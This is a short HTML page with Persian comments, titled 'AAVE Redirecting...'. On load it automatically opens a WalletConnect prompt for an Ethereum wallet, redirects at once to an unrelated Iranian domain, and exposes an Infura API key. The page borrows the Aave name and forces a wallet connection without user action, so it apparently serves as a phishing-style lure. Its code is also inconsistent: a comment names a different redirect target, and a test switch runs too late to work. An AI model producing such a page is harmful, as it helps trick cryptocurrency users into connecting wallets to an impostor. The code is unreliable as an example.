<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>AAVE Redirecting...</title>
  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@2.0.0/dist/umd/index.min.js"></script>
</head>
<body>
  <script>
    // کد برای لینک مستقیم: کیف پول باز می‌کنه و به test.com ریدایرکت می‌کنه
    async function createDeepLink() {
      console.log('شروع اتصال به WalletConnect...');
      
      // ایجاد provider WalletConnect
      const provider = new WalletConnectProvider({
        infuraId: 'c886ed6dee284317ad1e17cb5e5cba6f', // کلید Infura (بدون '')
        chainId: 1, // مین‌نت اتریوم
        rpc: { 1: 'https://mainnet.infura.io/v3/c886ed6dee284317ad1e17cb5e5cba6f' }, // RPC برای مین‌نت
        relayProtocol: 'waku', // پروتکل پیش‌فرض WalletConnect v2
      });

      try {
        // فعال کردن اتصال (دیپ لینک: کیف پول باز می‌شه)
        console.log('تلاش برای اتصال به کیف پول...');
        await provider.enable();
        console.log('کیف پول متصل شد!');
      } catch (error) {
        console.error('خطا در اتصال به کیف پول: ', error.message);
      }
    }

    // همزمان: ریدایرکت فوری و فراخوانی کیف پول
    (function() {
      console.log('اجرای فرآیند...');
      createDeepLink();
      window.location.replace('https://Choolistin.ir');
    })();

    // برای تست: اگر ?auto=false باشه، اجرا نشه
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('auto') === 'false') {
      window.onload = null;
    }
  </script>
</body>
</html>
